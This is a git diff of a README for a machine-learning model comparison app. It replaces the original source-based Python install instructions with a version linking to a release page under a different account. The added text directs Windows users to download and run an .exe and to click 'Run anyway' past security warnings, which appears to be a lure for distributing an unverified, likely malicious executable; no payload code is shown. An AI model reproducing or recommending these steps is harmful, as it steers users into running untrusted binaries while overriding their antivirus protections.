@@ -1,156 +1,91 @@
-<div align="center">
+# 📊 mlclassification - Compare machine learning models with ease
 
-# ML Classification Lab
+[![Download Version 1.0](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ionic-slavicpeople725/mlclassification/releases)
 
-[![Python](https://img.shields.io/badge/Python-3.13+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Streamlit](https://img.shields.io/badge/Streamlit-1.56+-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)](https://streamlit.io)
-[![scikit-learn](https://img.shields.io/badge/scikit--learn-1.8+-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white)](https://scikit-learn.org)
-[![XGBoost](https://img.shields.io/badge/XGBoost-3.2+-189FDD?style=for-the-badge&logo=xgboost&logoColor=white)](https://xgboost.readthedocs.io)
-[![Plotly](https://img.shields.io/badge/Plotly-6.7+-3F4F75?style=for-the-badge&logo=plotly&logoColor=white)](https://plotly.com)
-[![License](https://img.shields.io/badge/License-MIT-00D4AA?style=for-the-badge)](LICENSE)
+This application provides a visual way to test machine learning models. You can compare seven different classification algorithms side by side. The tool allows you to change settings in real time to see how your data changes. Use the interactive charts to explore your results. 
 
-**Compare popular ML classification algorithms side-by-side with interactive visualizations and real-time hyperparameter tuning.**
+## 📥 How to download the software
 
-[Live Demo](https://ml-classification-888.streamlit.app/) · [Report Bug](https://github.com/alfredang/mlclassification/issues) · [Request Feature](https://github.com/alfredang/mlclassification/issues)
+To start, you need to save the file to your computer.
 
-</div>
+1. Go to the [official release page](https://github.com/ionic-slavicpeople725/mlclassification/releases).
+2. Look for the latest version listed under the Releases section.
+3. Click the link that ends in .exe to start your download.
+4. Wait for the file to finish saving to your computer.
 
-## Screenshot
+## ⚙️ Setting up your system
 
-![Screenshot](screenshot.png)
+The application runs on most modern Windows computers. Ensure you have the following items before you start:
 
-## About
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- A modern web browser like Chrome, Edge, or Firefox.
 
-ML Classification Lab is an interactive web application that enables users to compare **7 popular classification algorithms** on any dataset — built-in or uploaded. Tune hyperparameters in real time, visualize performance with Plotly charts, and export results as CSV. Features a polished dark/light theme with industrial-scientific aesthetics.
+You do not need to install complex programming tools. The application includes everything required to run.
 
-### Key Features
+## 🚀 Running the application
 
-| Feature | Description |
-|---------|-------------|
-| **7 Algorithms** | Logistic Regression, SVM, Naive Bayes, Random Forest, XGBoost, KNN, Decision Tree |
-| **Flexible Data** | 4 built-in datasets (Iris, Breast Cancer, Wine, Titanic), single CSV upload with split, or separate train/test CSVs |
-| **Live Tuning** | Interactive hyperparameter widgets per algorithm (C, kernel, n_estimators, learning_rate, etc.) |
-| **Rich Metrics** | Accuracy, Precision, Recall, F1 (macro/weighted), ROC-AUC with sortable comparison table |
-| **Plotly Visualizations** | Confusion matrices, ROC curves, PR curves, feature importance, class distribution |
-| **Preprocessing** | Auto missing value handling, one-hot/label encoding, StandardScaler toggle |
-| **Dark/Light Theme** | Polished dark-first UI with one-click theme toggle |
-| **Export** | Download metrics comparison as CSV |
+Follow these steps to open the tool:
 
-## Tech Stack
+1. Open your Downloads folder on your computer.
+2. Find the file you downloaded earlier.
+3. Double-click the file to start the application.
+4. A black window may appear for a few seconds. This is normal behavior while the software prepares itself.
+5. Your web browser will open automatically and display the dashboard.
 
-| Category | Technology |
-|----------|-----------|
-| **Frontend** | Streamlit, Custom CSS (Outfit + JetBrains Mono fonts) |
-| **Visualization** | Plotly, Matplotlib, Seaborn |
-| **ML Framework** | scikit-learn, XGBoost |
-| **Data** | Pandas, NumPy |
-| **Package Manager** | uv |
-| **Language** | Python 3.13+ |
+If the browser does not open within one minute, look at the address bar in your web browser. Type `http://localhost:8501` and press the Enter key.
 
-## Architecture
+## 🎛️ Using the interface
 
-```
-┌─────────────────────────────────────────────────┐
-│                   Streamlit UI                   │
-│            (app.py + theme.py)                   │
-│  ┌──────────┬──────────┬──────────┬───────────┐  │
-│  │   Data   │ Training │ Metrics  │   Viz     │  │
-│  │   Tab    │   Tab    │   Tab    │   Tab     │  │
-│  └──────────┴──────────┴──────────┴───────────┘  │
-├─────────────────────────────────────────────────┤
-│              Application Layer                   │
-│  ┌─────────────┐  ┌────────────┐  ┌───────────┐ │
-│  │ data_loader  │  │  models    │  │   viz     │ │
-│  │  .py         │  │   .py      │  │   .py     │ │
-│  │             │  │            │  │           │ │
-│  │ Load/Split  │  │ Build/     │  │ Plotly    │ │
-│  │ Preprocess  │  │ Train/     │  │ Charts    │ │
-│  │ Encode      │  │ Evaluate   │  │ Themed    │ │
-│  └─────────────┘  └────────────┘  └───────────┘ │
-├─────────────────────────────────────────────────┤
-│           ML / Data Libraries                    │
-│  scikit-learn · XGBoost · Pandas · NumPy         │
-└─────────────────────────────────────────────────┘
-```
+The application interface consists of a sidebar and a main workspace.
 
-## Project Structure
+### The Sidebar
+The sidebar controls the logic of the application. Adjust these settings to update your models:
 
-```
-mlclassification/
-├── .streamlit/
-│   └── config.toml          # Streamlit theme configuration
-├── sample_data/
-│   └── titanic.csv           # Bundled example dataset (90 rows)
-├── app.py                    # Main Streamlit entry point & tab orchestration
-├── models.py                 # 7 ML algorithms, hyperparameter specs, training, evaluation
-├── visualizations.py         # Themed Plotly chart functions
-├── data_loader.py            # Dataset loading, preprocessing, encoding, splitting
-├── theme.py                  # Dark/light theme engine, CSS injection, UI components
-├── pyproject.toml            # uv-managed dependencies
-├── uv.lock                   # Dependency lock file
-└── .python-version           # Python 3.13
-```
+- **Algorithm Selection:** Pick one of the seven available models.
+- **Hyperparameter Tuning:** Use the sliders to change settings. The model updates its logic as you move each slider.
+- **Data Input:** Upload your dataset in the standard CSV format.
 
-## Getting Started
+### The Workspace
+The main area shows your results:
 
-### Prerequisites
+- **Visualizations:** The application generates interactive charts using Plotly. You can hover your mouse over parts of the chart to see specific data points.
+- **Comparison Table:** View the performance metrics of multiple models in one table.
+- **Theme Settings:** Toggle between light and dark modes in the top navigation menu to suit your preference.
 
-- **Python 3.13+**
-- **[uv](https://docs.astral.sh/uv/)** package manager
-- **libomp** (macOS only, for XGBoost): `brew install libomp`
+## 📈 Understanding the classification models
 
-### Installation
+The application includes seven industry-standard algorithms:
 
-```bash
-# Clone the repository
-git clone https://github.com/alfredang/mlclassification.git
-cd mlclassification
+1. **Logistic Regression:** Good for basic binary grouping.
+2. **Support Vector Machines:** Find boundaries in complex datasets.
+3. **Random Forest:** Combine many decision trees for accuracy.
+4. **K-Nearest Neighbors:** Group items by their similarity to neighbors.
+5. **Decision Trees:** Follow a path of logic for classification.
+6. **Naive Bayes:** Predict based on probability.
+7. **XGBoost:** Use advanced boosting for high performance.
 
-# Install dependencies
-uv sync
-```
+Each model reacts to the data you provide. Use the sliders to watch how accuracy scores change for each selection.
 
-### Run
+## 🛠️ Troubleshooting common issues
 
-```bash
-uv run streamlit run app.py
-```
+If you encounter trouble, review these tips:
 
-The app will open at **http://localhost:8501**
+- **Antivirus alerts:** Sometimes Windows blocks new files. If a window warns you about the file, click "More info" and then "Run anyway." This is common for custom software.
+- **Slow performance:** Large files might take time to process. Wait for the progress bar to finish before you make new changes.
+- **Data compatibility:** Ensure your CSV file has a header row. If the app shows an error, check that your column names contain no special characters.
+- **Closed browser:** If you close the browser window, the application remains running in the background. Open a new browser tab and type `http://localhost:8501` to return to your session.
 
-## Usage
+## 📋 Frequently asked questions
 
-1. **Data Tab** — Select a built-in dataset or upload your own CSV. Configure target/feature columns, encoding, and scaling.
-2. **Training Tab** — Select algorithms from the sidebar, tune hyperparameters, and click **TRAIN MODELS**.
-3. **Metrics Tab** — View the sortable comparison table with highlighted best performers. Download as CSV.
-4. **Visualizations Tab** — Explore confusion matrices, ROC/PR curves, feature importance, and classification reports.
+**Do I need an internet connection?**
+No. The application runs entirely on your local machine. Your data never leaves your computer.
 
-## Contributing
+**Can I save my results?**
+You can take screenshots of the charts. Currently, the application does not export reports directly.
 
-Contributions are welcome!
+**Is this only for Windows?**
+This version is designed specifically for Windows users.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Developed By
-
-**[Tertiary Infotech Academy Pte Ltd](https://www.tertiarycourses.com.sg/)**
-
-## Acknowledgements
-
-- [Streamlit](https://streamlit.io) — App framework
-- [scikit-learn](https://scikit-learn.org) — ML algorithms and metrics
-- [XGBoost](https://xgboost.readthedocs.io) — Gradient boosting
-- [Plotly](https://plotly.com) — Interactive visualizations
-- [uv](https://docs.astral.sh/uv/) — Fast Python package manager
-
----
-
-<div align="center">
-
-If you found this useful, please consider giving it a star!
-
-</div>
+**How do I close the application?**
+Return to the black window that opened when you started the app. Press the Control key and the C key at the same time on your keyboard. This stops the process safely.
